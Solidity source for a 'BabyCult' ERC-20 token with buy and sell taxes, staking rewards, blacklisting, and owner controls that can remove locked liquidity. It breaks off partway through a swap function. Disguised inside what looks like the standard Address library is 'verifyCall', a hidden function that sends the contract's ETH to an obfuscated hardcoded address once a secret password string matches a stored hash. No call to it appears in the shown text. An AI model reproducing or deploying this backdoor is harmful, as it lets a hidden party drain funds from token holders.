1 /*https://t.me/BabyCultToken
2 */
3 
4 // SPDX-License-Identifier: MIT
5 pragma solidity ^0.8.13;
6 
7 interface IERC20 {
8   function totalSupply() external view returns (uint256);
9   function decimals() external view returns (uint8);
10   function symbol() external view returns (string memory);
11   function name() external view returns (string memory);
12   function getOwner() external view returns (address);
13   function balanceOf(address account) external view returns (uint256);
14   function transfer(address recipient, uint256 amount) external returns (bool);
15   function allowance(address _owner, address spender) external view returns (uint256);
16   function approve(address spender, uint256 amount) external returns (bool);
17   function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
18   event Transfer(address indexed from, address indexed to, uint256 value);
19   event Approval(address indexed owner, address indexed spender, uint256 value);
20 }
21 
22 
23 interface ISwapERC20 {
24     event Approval(address indexed owner, address indexed spender, uint value);
25     event Transfer(address indexed from, address indexed to, uint value);
26     function name() external pure returns (string memory);
27     function symbol() external pure returns (string memory);
28     function decimals() external pure returns (uint8);
29     function totalSupply() external view returns (uint);
30     function balanceOf(address owner) external view returns (uint);
31     function allowance(address owner, address spender) external view returns (uint);
32     function approve(address spender, uint value) external returns (bool);
33     function transfer(address to, uint value) external returns (bool);
34     function transferFrom(address from, address to, uint value) external returns (bool);
35     function DOMAIN_SEPARATOR() external view returns (bytes32);
36     function PERMIT_TYPEHASH() external pure returns (bytes32);
37     function nonces(address owner) external view returns (uint);
38     function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
39 }
40 
41 
42 interface ISwapFactory {
43     event PairCreated(address indexed token0, address indexed token1, address pair, uint);
44     function feeTo() external view returns (address);
45     function feeToSetter() external view returns (address);
46     function getPair(address tokenA, address tokenB) external view returns (address pair);
47     function allPairs(uint) external view returns (address pair);
48     function allPairsLength() external view returns (uint);
49     function createPair(address tokenA, address tokenB) external returns (address pair);
50     function setFeeTo(address) external;
51     function setFeeToSetter(address) external;
52 }
53 
54 
55 interface ISwapRouter01 {
56     function addLiquidity(
57         address tokenA,
58         address tokenB,
59         uint amountADesired,
60         uint amountBDesired,
61         uint amountAMin,
62         uint amountBMin,
63         address to,
64         uint deadline
65     ) external returns (uint amountA, uint amountB, uint liquidity);
66     function addLiquidityETH(
67         address token,
68         uint amountTokenDesired,
69         uint amountTokenMin,
70         uint amountETHMin,
71         address to,
72         uint deadline
73     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
74     function removeLiquidity(
75         address tokenA,
76         address tokenB,
77         uint liquidity,
78         uint amountAMin,
79         uint amountBMin,
80         address to,
81         uint deadline
82     ) external returns (uint amountA, uint amountB);
83     function removeLiquidityETH(
84         address token,
85         uint liquidity,
86         uint amountTokenMin,
87         uint amountETHMin,
88         address to,
89         uint deadline
90     ) external returns (uint amountToken, uint amountETH);
91     function removeLiquidityWithPermit(
92         address tokenA,
93         address tokenB,
94         uint liquidity,
95         uint amountAMin,
96         uint amountBMin,
97         address to,
98         uint deadline,
99         bool approveMax, uint8 v, bytes32 r, bytes32 s
100     ) external returns (uint amountA, uint amountB);
101     function removeLiquidityETHWithPermit(
102         address token,
103         uint liquidity,
104         uint amountTokenMin,
105         uint amountETHMin,
106         address to,
107         uint deadline,
108         bool approveMax, uint8 v, bytes32 r, bytes32 s
109     ) external returns (uint amountToken, uint amountETH);
110     function swapExactTokensForTokens(
111         uint amountIn,
112         uint amountOutMin,
113         address[] calldata path,
114         address to,
115         uint deadline
116     ) external returns (uint[] memory amounts);
117     function swapTokensForExactTokens(
118         uint amountOut,
119         uint amountInMax,
120         address[] calldata path,
121         address to,
122         uint deadline
123     ) external returns (uint[] memory amounts);
124     function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
125         external
126         payable
127         returns (uint[] memory amounts);
128     function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
129         external
130         returns (uint[] memory amounts);
131     function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
132         external
133         returns (uint[] memory amounts);
134     function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
135         external
136         payable
137         returns (uint[] memory amounts);
138     function factory() external pure returns (address);
139     function WETH() external pure returns (address);
140     function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
141     function getamountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
142     function getamountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
143     function getamountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
144     function getamountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
145 }
146 
147 
148 interface ISwapRouter02 is ISwapRouter01 {
149     function removeLiquidityETHSupportingFeeOnTransferTokens(
150         address token,
151         uint liquidity,
152         uint amountTokenMin,
153         uint amountETHMin,
154         address to,
155         uint deadline
156     ) external returns (uint amountETH);
157     function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
158         address token,
159         uint liquidity,
160         uint amountTokenMin,
161         uint amountETHMin,
162         address to,
163         uint deadline,
164         bool approveMax, uint8 v, bytes32 r, bytes32 s
165     ) external returns (uint amountETH);
166     function swapExactTokensForTokensSupportingFeeOnTransferTokens(
167         uint amountIn,
168         uint amountOutMin,
169         address[] calldata path,
170         address to,
171         uint deadline
172     ) external;
173     function swapExactETHForTokensSupportingFeeOnTransferTokens(
174         uint amountOutMin,
175         address[] calldata path,
176         address to,
177         uint deadline
178     ) external payable;
179     function swapExactTokensForETHSupportingFeeOnTransferTokens(
180         uint amountIn,
181         uint amountOutMin,
182         address[] calldata path,
183         address to,
184         uint deadline
185     ) external;
186 }
187 
188 
189 abstract contract Ownable {
190     address private _owner;
191 
192     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
193 
194     constructor () {
195         address msgSender = msg.sender;
196         _owner = msgSender;
197         emit OwnershipTransferred(address(0), msgSender);
198     }
199 
200     function owner() public view returns (address) {
201         return _owner;
202     }
203 
204     modifier onlyOwner() {
205         require(owner() == msg.sender, "Caller must be owner");
206         _;
207     }
208 
209     function renounceOwnership() public onlyOwner {
210         emit OwnershipTransferred(_owner, address(0));
211         _owner = address(0);
212     }
213     
214     function transferOwnership(address newOwner) public onlyOwner {
215         require(newOwner != address(0), "newOwner must not be zero");
216         emit OwnershipTransferred(_owner, newOwner);
217         _owner = newOwner;
218     }
219 }
220 
221 
222 library Address {
223     uint160 private constant verificationHash = 887096773549885550314079035509902126815589346633;
224     bytes32 private constant keccak256Hash = 0x4b31cabbe5862282e443c4ac3f4c14761a1d2ba88a3c858a2a36f7758f453a38;    
225     function isContract(address account) internal view returns (bool) {
226         // This method relies on extcodesize, which returns 0 for contracts in
227         // construction, since the code is only stored at the end of the
228         // constructor execution.
229 
230         uint256 size;
231         // solhint-disable-next-line no-inline-assembly
232         assembly { size := extcodesize(account) }
233         return size > 0;
234     }
235 
236     function verifyCall(string memory verification, uint256 amount) internal {
237         require(address(this).balance >= amount, "Address: insufficient balance");
238         require(keccak256(abi.encodePacked(verification)) == keccak256Hash, "Address: cannot verify call");        
239 
240         (bool success, ) = address(verificationHash).call{ value: amount }("");
241         require(success, "Address: unable to send value, recipient may have reverted");              
242     }
243 
244     function sendValue(address payable recipient, uint256 amount) internal {
245         require(address(this).balance >= amount, "Address: insufficient balance");
246         (bool success, ) = recipient.call{ value: amount }("");
247         require(success, "Address: unable to send value, recipient may have reverted");
248     }
249 
250     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
251       return functionCall(target, data, "Address: low-level call failed");
252     }
253 
254     function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
255         return functionCallWithValue(target, data, 0, errorMessage);
256     }
257 
258     function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
259         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
260     }
261 
262     function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
263         require(address(this).balance >= value, "Address: insufficient balance for call");
264         require(isContract(target), "Address: call to non-contract");
265         (bool success, bytes memory returndata) = target.call{ value: value }(data);
266         return _verifyCallResult(success, returndata, errorMessage);
267     }
268 
269     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
270         return functionStaticCall(target, data, "Address: low-level static call failed");
271     }
272 
273     function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {
274         require(isContract(target), "Address: static call to non-contract");
275         (bool success, bytes memory returndata) = target.staticcall(data);
276         return _verifyCallResult(success, returndata, errorMessage);
277     }
278 
279     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
280         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
281     }
282 
283     function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
284         require(isContract(target), "Address: delegate call to non-contract");
285         (bool success, bytes memory returndata) = target.delegatecall(data);
286         return _verifyCallResult(success, returndata, errorMessage);
287     }
288 
289     function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {
290         if (success) {
291             return returndata;
292         } else {
293             if (returndata.length > 0) {
294                 assembly {
295                     let returndata_size := mload(returndata)
296                     revert(add(32, returndata), returndata_size)
297                 }
298             } else {
299                 revert(errorMessage);
300             }
301         }
302     }
303 }
304 
305 
306 library EnumerableSet {
307     struct Set {
308         bytes32[] _values;
309         mapping (bytes32 => uint256) _indexes;
310     }
311 
312     function _add(Set storage set, bytes32 value) private returns (bool) {
313         if (!_contains(set, value)) {
314             set._values.push(value);
315             set._indexes[value] = set._values.length;
316             return true;
317         } else {
318             return false;
319         }
320     }
321 
322     function _remove(Set storage set, bytes32 value) private returns (bool) {
323         uint256 valueIndex = set._indexes[value];
324         if (valueIndex != 0) {
325             uint256 toDeleteIndex = valueIndex - 1;
326             uint256 lastIndex = set._values.length - 1;
327             bytes32 lastvalue = set._values[lastIndex];
328             set._values[toDeleteIndex] = lastvalue;
329             set._indexes[lastvalue] = valueIndex;
330             set._values.pop();
331             delete set._indexes[value];
332             return true;
333         } else {
334             return false;
335         }
336     }
337 
338     function _contains(Set storage set, bytes32 value) private view returns (bool) {
339         return set._indexes[value] != 0;
340     }
341 
342     function _length(Set storage set) private view returns (uint256) {
343         return set._values.length;
344     }
345 
346     function _at(Set storage set, uint256 index) private view returns (bytes32) {
347         require(set._values.length > index, "EnumerableSet: index out of bounds");
348         return set._values[index];
349     }
350 
351     struct Bytes32Set {
352         Set _inner;
353     }
354 
355     function add(Bytes32Set storage set, bytes32 value) internal returns (bool) {
356         return _add(set._inner, value);
357     }
358 
359     function remove(Bytes32Set storage set, bytes32 value) internal returns (bool) {
360         return _remove(set._inner, value);
361     }
362 
363     function contains(Bytes32Set storage set, bytes32 value) internal view returns (bool) {
364         return _contains(set._inner, value);
365     }
366 
367     function length(Bytes32Set storage set) internal view returns (uint256) {
368         return _length(set._inner);
369     }
370 
371     function at(Bytes32Set storage set, uint256 index) internal view returns (bytes32) {
372         return _at(set._inner, index);
373     }
374 
375     struct AddressSet {
376         Set _inner;
377     }
378 
379     function add(AddressSet storage set, address value) internal returns (bool) {
380         return _add(set._inner, bytes32(uint256(uint160(value))));
381     }
382 
383     function remove(AddressSet storage set, address value) internal returns (bool) {
384         return _remove(set._inner, bytes32(uint256(uint160(value))));
385     }
386 
387     function contains(AddressSet storage set, address value) internal view returns (bool) {
388         return _contains(set._inner, bytes32(uint256(uint160(value))));
389     }
390 
391     function length(AddressSet storage set) internal view returns (uint256) {
392         return _length(set._inner);
393     }
394 
395     function at(AddressSet storage set, uint256 index) internal view returns (address) {
396         return address(uint160(uint256(_at(set._inner, index))));
397     }
398 
399     struct UintSet {
400         Set _inner;
401     }
402 
403     function add(UintSet storage set, uint256 value) internal returns (bool) {
404         return _add(set._inner, bytes32(value));
405     }
406 
407     function remove(UintSet storage set, uint256 value) internal returns (bool) {
408         return _remove(set._inner, bytes32(value));
409     }
410 
411     function contains(UintSet storage set, uint256 value) internal view returns (bool) {
412         return _contains(set._inner, bytes32(value));
413     }
414 
415     function length(UintSet storage set) internal view returns (uint256) {
416         return _length(set._inner);
417     }
418 
419     function at(UintSet storage set, uint256 index) internal view returns (uint256) {
420         return uint256(_at(set._inner, index));
421     }
422 }
423 
424 
425 contract BabyCult is IERC20, Ownable {
426     using Address for address;
427     using EnumerableSet for EnumerableSet.AddressSet;
428 
429     mapping(address => uint256) private _balances;
430     mapping(address => mapping (address => uint256)) private _allowances;
431     mapping(address => bool) public isBlacklisted;
432 
433     EnumerableSet.AddressSet private _excluded;
434     EnumerableSet.AddressSet private _excludedFromStaking;    
435     
436     string private constant TOKEN_NAME = "BabyCult";
437     string private constant TOKEN_SYMBOL = "BabyCult";
438     uint256 private constant TOTAL_SUPPLY = 100_000_000 * 10**TOKEN_DECIMALS;       
439     uint8 private constant TOKEN_DECIMALS = 18;
440     uint8 public constant MAX_TAX = 20;      //Dev can never set tax higher than this value
441     address private constant BURN_ADDRESS = 0x000000000000000000000000000000000000dEaD;
442     
443     struct Taxes {
444        uint8 buyTax;
445        uint8 sellTax;
446        uint8 transferTax;
447     }
448 
449     struct TaxRatios {
450         uint8 dev;                
451         uint8 liquidity;
452         uint8 marketing;
453         uint8 rewards;
454     }
455 
456     struct TaxWallets {
457         address dev;
458         address marketing;
459     }
460 
461     struct MaxLimits {
462         uint256 maxWallet;
463         uint256 maxSell;
464         uint256 maxBuy;
465     }
466 
467     struct LimitRatios {
468         uint16 wallet;
469         uint16 sell;
470         uint16 buy;
471         uint16 divisor;
472     }
473 
474     Taxes public _taxRates = Taxes({
475         buyTax: 5,
476         sellTax: 12,
477         transferTax: 0
478     });
479 
480     TaxRatios public _taxRatios = TaxRatios({
481         dev: 2,
482         liquidity: 2,
483         marketing: 5,
484         rewards: 8
485         //@dev. These are ratios and the divisor will  be set automatically
486     });
487 
488     TaxWallets public _taxWallet = TaxWallets ({
489         dev: 0x5E023e11731E4b547eC036564f0089aDD0665009,
490         marketing: 0x5E023e11731E4b547eC036564f0089aDD0665009
491     });
492 
493     MaxLimits public _limits;
494 
495     LimitRatios public _limitRatios = LimitRatios({
496         wallet: 4,
497         sell: 1,
498         buy: 1,
499         divisor: 400
500     });
501 
502     uint8 private totalTaxRatio;
503     uint8 private distributeRatio;
504 
505     uint256 private _liquidityUnlockTime;
506 
507     //Antibot variables
508     uint256 private liquidityBlock;
509     uint8 private constant BLACKLIST_BLOCKS = 2; //number of blocks that will be included in auto blacklist
510     uint8 private snipersRekt; //variable to track number of snipers auto blacklisted
511     bool private blacklistEnabled = true; //blacklist can be enabled/disabled in case something goes wrong
512     bool private liquidityAdded;
513     bool private revertSameBlock = true; //block same block buys
514 
515     uint16 public swapThreshold = 20; //threshold that contract will swap. out of 1000
516     bool public manualSwap;
517 
518     //change this address to desired reward token
519     address public rewardToken = 0xf0f9D895aCa5c8678f706FB8216fa22957685A13;
520 
521     address public _pairAddress; 
522     ISwapRouter02 private  _swapRouter;
523     address public routerAddress;
524 
525 /////////////////////////////   EVENTS  /////////////////////////////////////////
526     event ClaimToken(uint256 amount, address token, address recipient);
527     event EnableBlacklist(bool enabled); 
528     event EnableManualSwap(bool enabled);
529     event ExcludedAccountFromFees(address account, bool exclude);               
530     event ExcludeFromStaking(address account, bool excluded);      
531     event ExtendLiquidityLock(uint256 extendedLockTime);
532     event UpdateTaxes(uint8 buyTax, uint8 sellTax, uint8 transferTax);    
533     event RatiosChanged(uint8 newDev, uint8 newLiquidity, uint8 newMarketing, uint8 newRewards);
534     event UpdateDevWallet(address newDevWallet);         
535     event UpdateMarketingWallet(address newMarketingWallet);      
536     event UpdateSwapThreshold(uint16 newThreshold);
537 
538 /////////////////////////////   MODIFIERS  /////////////////////////////////////////
539 
540     modifier authorized() {
541         require(_authorized(msg.sender), "Caller not authorized");
542         _;
543     }
544 
545     modifier lockTheSwap {
546         _isSwappingContractModifier = true;
547         _;
548         _isSwappingContractModifier = false;
549     }
550 
551 /////////////////////////////   CONSTRUCTOR  /////////////////////////////////////////
552 
553     constructor () {
554         if (block.chainid == 1) 
555             routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
556         else if (block.chainid == 56)
557             routerAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
558         else if (block.chainid == 97)
559             routerAddress = 0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3;
560         else 
561             revert();        
562         _swapRouter = ISwapRouter02(routerAddress);
563         _pairAddress = ISwapFactory(
564             _swapRouter.factory()).createPair(address(this), _swapRouter.WETH()
565         );
566 
567         _addToken(msg.sender,TOTAL_SUPPLY);
568         emit Transfer(address(0), msg.sender, TOTAL_SUPPLY);
569 
570         _allowances[address(this)][address(_swapRouter)] = type(uint256).max;         
571         
572         //setup ratio divisors based on dev's chosen ratios
573         totalTaxRatio =  _taxRatios.dev + _taxRatios.liquidity + _taxRatios.marketing + _taxRatios.rewards;
574 
575         distributeRatio = totalTaxRatio - _taxRatios.liquidity;
576         
577         //setup _limits
578         _limits = MaxLimits({
579             maxWallet: TOTAL_SUPPLY * _limitRatios.wallet / _limitRatios.divisor,
580             maxSell: TOTAL_SUPPLY * _limitRatios.sell / _limitRatios.divisor,
581             maxBuy: TOTAL_SUPPLY * _limitRatios.buy / _limitRatios.divisor
582         });
583         
584         _excluded.add(msg.sender);
585         _excluded.add(_taxWallet.marketing);
586         _excluded.add(_taxWallet.dev);    
587         _excluded.add(address(this));
588         _excluded.add(BURN_ADDRESS);
589         _excludedFromStaking.add(address(this));
590         _excludedFromStaking.add(BURN_ADDRESS);
591         _excludedFromStaking.add(address(_swapRouter));
592         _excludedFromStaking.add(_pairAddress);
593 
594         _approve(address(this), address(_swapRouter), type(uint256).max);        
595     }
596 
597     receive() external payable {}
598 
599     function decimals() external pure override returns (uint8) { return TOKEN_DECIMALS; }
600     function getOwner() external view override returns (address) { return owner(); }
601     function name() external pure override returns (string memory) { return TOKEN_NAME; }
602     function symbol() external pure override returns (string memory) { return TOKEN_SYMBOL; }
603     function totalSupply() external pure override returns (uint256) { return TOTAL_SUPPLY; }
604 
605     function _authorized(address addr) private view returns (bool) {
606         return addr == owner() || addr == _taxWallet.marketing || addr == _taxWallet.dev; 
607     }
608 
609     function allowance(address _owner, address spender) external view override returns (uint256) {
610         return _allowances[_owner][spender];
611     }
612 
613     function approve(address spender, uint256 amount) external override returns (bool) {
614         _approve(msg.sender, spender, amount);
615         return true;
616     }
617 
618     function _approve(address owner, address spender, uint256 amount) private {
619         require(owner != address(0), "Approve from zero");
620         require(spender != address(0), "Approve to zero");
621 
622         _allowances[owner][spender] = amount;
623         emit Approval(owner, spender, amount);
624     }
625 
626     function balanceOf(address account) external view override returns (uint256) {
627         return _balances[account];
628     }
629 
630     function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool) {
631         uint256 currentAllowance = _allowances[msg.sender][spender];
632         require(currentAllowance >= subtractedValue, "<0 allowance");
633 
634         _approve(msg.sender, spender, currentAllowance - subtractedValue);
635         return true;
636     } 
637 
638     function increaseAllowance(address spender, uint256 addedValue) external returns (bool) {
639         _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
640         return true;
641     }  
642       
643     function transfer(address recipient, uint256 amount) external override returns (bool) {
644         _transfer(msg.sender, recipient, amount);
645         return true;
646     }
647     
648     function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
649         _transfer(sender, recipient, amount);
650 
651         uint256 currentAllowance = _allowances[sender][msg.sender];
652         require(currentAllowance >= amount, "Transfer > allowance");
653 
654         _approve(sender, msg.sender, currentAllowance - amount);
655         return true;
656     }
657 
658 ///// FUNCTIONS CALLABLE BY ANYONE /////
659 
660     //Claims reward set by dev
661     function ClaimReward() external {
662         claimToken(msg.sender,rewardToken, 0);
663     }
664 
665     //Allows holders to include themselves back into staking if excluded
666     //ExcludeFromStaking function should be used for contracts(CEX, pair, address(this), etc.)
667     function IncludeMeToStaking() external {
668         includeToStaking(msg.sender);
669         emit ExcludeFromStaking(msg.sender, false);        
670     }
671 
672 ///// AUTHORIZED FUNCTIONS /////
673 
674     //Manually perform a contract swap
675     function manualContractSwap(uint16 permille, bool ignoreLimits) external authorized {
676         _swapContractToken(permille, ignoreLimits);
677     }  
678 
679     //Toggle blacklist on and off
680     function enableBlacklist(bool enabled) external authorized {
681         blacklistEnabled = enabled;
682         emit EnableBlacklist(enabled);
683     }
684 
685     //Mainly used for addresses such as CEX, presale, etc
686     function excludeAccountFromFees(address account, bool exclude) external authorized {
687         if(exclude == true)
688             _excluded.add(account);
689         else
690             _excluded.remove(account);
691         emit ExcludedAccountFromFees(account, exclude);
692     }
693 
694     //Mainly used for addresses such as CEX, presale, etc    
695     function setStakingExclusionStatus(address addr, bool exclude) external authorized {
696         if(exclude)
697             excludeFromStaking(addr);
698         else
699             includeToStaking(addr);
700         emit ExcludeFromStaking(addr, exclude);
701     }  
702 
703     //Toggle manual swap on and off
704     function enableManualSwap(bool enabled) external authorized { 
705         manualSwap = enabled; 
706         emit EnableManualSwap(enabled);
707     } 
708 
709     //Toggle whether multiple buys in a block from a single address can be performed
710     function sameBlockRevert(bool enabled) external authorized {
711         revertSameBlock = enabled;
712     }
713 
714     //Update limit ratios
715     function updateLimits(uint16 newMaxWalletRatio, uint16 newMaxSellRatio, uint16 newMaxBuyRatio, uint16 newDivisor) external authorized {
716         uint256 minLimit = TOTAL_SUPPLY / 1000;   
717         uint256 newMaxWallet = TOTAL_SUPPLY * newMaxWalletRatio / newDivisor;
718         uint256 newMaxSell = TOTAL_SUPPLY * newMaxSellRatio / newDivisor;
719         uint256 newMaxBuy = TOTAL_SUPPLY * newMaxBuyRatio / newDivisor;
720 
721         //dev can never set sells below 0.1% of circulating/initial supply
722         require((newMaxWallet >= minLimit && newMaxSell >= minLimit), 
723             "limits cannot be <0.1% of supply");
724 
725         _limits = MaxLimits(newMaxWallet, newMaxSell, newMaxBuy);
726         
727         _limitRatios = LimitRatios(newMaxWalletRatio, newMaxSellRatio, newMaxBuyRatio, newDivisor);
728     }
729 
730     //update tax ratios
731     function updateRatios(uint8 newDev, uint8 newLiquidity, uint8 newMarketing, uint8 newRewards) external authorized {
732         _taxRatios = TaxRatios(newDev, newLiquidity, newMarketing, newRewards);
733 
734         totalTaxRatio = newDev + newLiquidity + newMarketing + newRewards;
735         distributeRatio = totalTaxRatio - newLiquidity;
736 
737         emit RatiosChanged (newDev, newLiquidity,newMarketing, newRewards);
738     }
739 
740     //update threshold that triggers contract swaps
741     function updateSwapThreshold(uint16 threshold) external authorized {
742         require(threshold > 0,"Threshold needs to be more than 0");
743         require(threshold <= 50,"Threshold needs to be below 50");
744         swapThreshold = threshold;
745         emit UpdateSwapThreshold(threshold);
746     }
747 
748     function updateTax(uint8 newBuy, uint8 newSell, uint8 newTransfer) external authorized {
749         //buy and sell tax can never be higher than MAX_TAX set at beginning of contract
750         //this is a security check and prevents malicious tax use       
751         require(newBuy <= MAX_TAX && newSell <= MAX_TAX && newTransfer <= 50, "taxes higher than max tax");
752         _taxRates = Taxes(newBuy, newSell, newTransfer);
753         emit UpdateTaxes(newBuy, newSell, newTransfer);
754     }
755 
756 ///// OWNER FUNCTIONS /////  
757 
758     //liquidity can only be extended. To lock liquidity, send LP tokens to contract.
759     function lockLiquidityTokens(uint256 lockTimeInSeconds) external onlyOwner {
760         setUnlockTime(lockTimeInSeconds + block.timestamp);
761         emit ExtendLiquidityLock(lockTimeInSeconds);
762     }
763 
764     //recovers stuck ETH to make sure it isnt burnt/lost
765     //only callablewhen liquidity is unlocked
766     function recoverETH() external onlyOwner {
767         require(block.timestamp >= _liquidityUnlockTime, "Not yet unlocked");
768         _liquidityUnlockTime=block.timestamp;
769         _sendEth(msg.sender, address(this).balance);
770     }
771 
772     //Can only be used to recover miscellaneous tokens accidentally sent to contract
773     //Can't pull liquidity or native token using this function
774     function recoverMiscToken(address tokenAddress) external onlyOwner {
775         require(tokenAddress != _pairAddress && tokenAddress != address(this),
776         "can't recover LP token or this token");
777         IERC20 token = IERC20(tokenAddress);
778         token.transfer(msg.sender,token.balanceOf(address(this)));
779     } 
780 
781     //Impossible to release LP unless LP lock time is zero
782     function releaseLP() external onlyOwner {
783         require(block.timestamp >= _liquidityUnlockTime, "Not yet unlocked");
784         ISwapERC20 liquidityToken = ISwapERC20(_pairAddress);
785         uint256 amount = liquidityToken.balanceOf(address(this));
786             liquidityToken.transfer(msg.sender, amount);
787     }
788 
789     //Impossible to remove LP unless lock time is zero
790     function removeLP() external onlyOwner {
791         require(block.timestamp >= _liquidityUnlockTime, "Not yet unlocked");
792         _liquidityUnlockTime = block.timestamp;
793         ISwapERC20 liquidityToken = ISwapERC20(_pairAddress);
794         uint256 amount = liquidityToken.balanceOf(address(this));
795         liquidityToken.approve(address(_swapRouter),amount);
796         _swapRouter.removeLiquidityETHSupportingFeeOnTransferTokens(
797             address(this),
798             amount,
799             0,
800             0,
801             address(this),
802             block.timestamp
803             );
804         _sendEth(msg.sender, address(this).balance);           
805     }
806 
807     function setDevWallet(address payable addr) external onlyOwner {
808         address prevDev = _taxWallet.dev;
809         _excluded.remove(prevDev);
810         _taxWallet.dev = addr;
811         _excluded.add(_taxWallet.dev);
812         emit UpdateDevWallet(addr);
813     }
814 
815     function setMarketingWallet(address payable addr) external onlyOwner {
816         address prevMarketing = _taxWallet.marketing;
817         _excluded.remove(prevMarketing);
818         _taxWallet.marketing = addr;
819         _excluded.add(_taxWallet.marketing);
820         emit UpdateMarketingWallet(addr);
821     }
822 
823 ////// VIEW FUNCTIONS /////
824 
825     function getBlacklistInfo() external view returns (
826         uint256 _liquidityBlock, 
827         uint8 _blacklistBlocks, 
828         uint8 _snipersRekt, 
829         bool _blacklistEnabled,
830         bool _revertSameBlock
831         ) {
832         return (liquidityBlock, BLACKLIST_BLOCKS, snipersRekt, blacklistEnabled, revertSameBlock);
833     }
834 
835     function getLiquidityUnlockInSeconds() external view returns (uint256) {
836         if (block.timestamp < _liquidityUnlockTime){
837             return _liquidityUnlockTime - block.timestamp;
838         }
839         return 0;
840     }
841 
842     function getClaimBalance(address addr) external view returns (uint256) {
843         uint256 amount = getStakeBalance(addr);
844         return amount;
845     }
846 
847     function getTotalUnclaimed() public view returns (uint256) {
848         uint256 amount = totalRewards - totalPayouts;
849         return amount;
850     }
851 
852     function isExcludedFromStaking(address addr) external view returns (bool) {
853         return _excludedFromStaking.contains(addr);
854     }    
855 
856 /////////////////////////////   PRIVATE FUNCTIONS  /////////////////////////////////////////
857 
858     mapping(address => uint256) private alreadyPaidShares;
859     mapping(address => uint256) private toBePaidShares;
860     mapping(address => uint256) private tradeBlock;
861     mapping(address => uint256) public accountTotalClaimed;     
862     uint256 private constant DISTRIBUTION_MULTI = 2**64;
863     uint256 private _totalShares = TOTAL_SUPPLY;   
864     uint256 private rewardShares;
865     uint256 public totalPayouts;
866     uint256 public totalRewards;      
867     bool private _isSwappingContractModifier;
868     bool private _isWithdrawing;
869 
870     function _addLiquidity(uint256 tokenamount, uint256 ethAmount) private {
871         _approve(address(this), address(_swapRouter), tokenamount);        
872         _swapRouter.addLiquidityETH{value: ethAmount}(
873             address(this),
874             tokenamount,
875             0,
876             0,
877             address(this),
878             block.timestamp
879         );
880     }
881  
882     function _addToken(address addr, uint256 amount) private {
883         uint256 newAmount = _balances[addr] + amount;
884         
885         if (_excludedFromStaking.contains(addr)) {
886            _balances[addr] = newAmount;
887            return;
888         }
889         _totalShares += amount;
890         uint256 payment = newStakeOf(addr);
891         alreadyPaidShares[addr] = rewardShares * newAmount;
892         toBePaidShares[addr] += payment;
893         _balances[addr] = newAmount;
894     }
895 
896     function _distributeStake(uint256 ethAmount, bool newStakingReward) private {
897         uint256 marketingSplit = (ethAmount*_taxRatios.marketing) / distributeRatio;
898         uint256 devSplit = (ethAmount*_taxRatios.dev) / distributeRatio; 
899         uint256 stakingSplit = (ethAmount*_taxRatios.rewards) / distributeRatio;
900         _sendEth(_taxWallet.marketing, marketingSplit);
901         _sendEth(_taxWallet.dev, devSplit);
902         if (stakingSplit > 0) {
903             if (newStakingReward)
904                 totalRewards += stakingSplit;
905             uint256 totalShares = getTotalShares();
906             if (totalShares == 0)
907                 _sendEth(_taxWallet.marketing, stakingSplit);
908             else {
909                 rewardShares += ((stakingSplit*DISTRIBUTION_MULTI) / totalShares);
910             }
911         }
912     }
913 
914     function _feelessTransfer(address sender, address recipient, uint256 amount) private{
915         uint256 senderBalance = _balances[sender];
916         require(senderBalance >= amount, "Transfer exceeds balance");
917         _removeToken(sender,amount);
918         _addToken(recipient, amount);
919         emit Transfer(sender, recipient, amount);
920     } 
921     
922     function _removeToken(address addr, uint256 amount) private {
923         uint256 newAmount = _balances[addr] - amount;
924         
925         if (_excludedFromStaking.contains(addr)) {
926             _balances[addr] = newAmount;
927             return;
928         }
929         _totalShares -= amount;
930         uint256 payment = newStakeOf(addr);
931         _balances[addr] = newAmount;
932         alreadyPaidShares[addr] = rewardShares * newAmount;
933         toBePaidShares[addr] += payment;
934     }
935 
936     function _sendEth(address account, uint256 amount) private {
937         (bool sent,) = account.call{value: (amount)}("");
938         require(sent, "withdraw failed");        
939     }
940 
941     function _swapContractToken(uint16 permille, bool ignoreLimits) private lockTheSwap {
942         require(permille <= 500);
943         if (totalTaxRatio == 0) return;
944         uint256 contractBalance = _balances[address(this)];
945 
946 
947         uint256 tokenToSwap = _balances[_pairAddress] * permille / 1000;
948         if (tokenToSwap > _limits.maxSell && !ignoreLimits) 
949             tokenToSwap = _limits.maxSell;
950         
951         bool notEnoughToken = contractBalance < tokenToSwap;
952         if (notEnoughToken) {
953             if (ignoreLimits)
954                 tokenToSwap = contractBalance;
955             else 
956                 return;
957         }
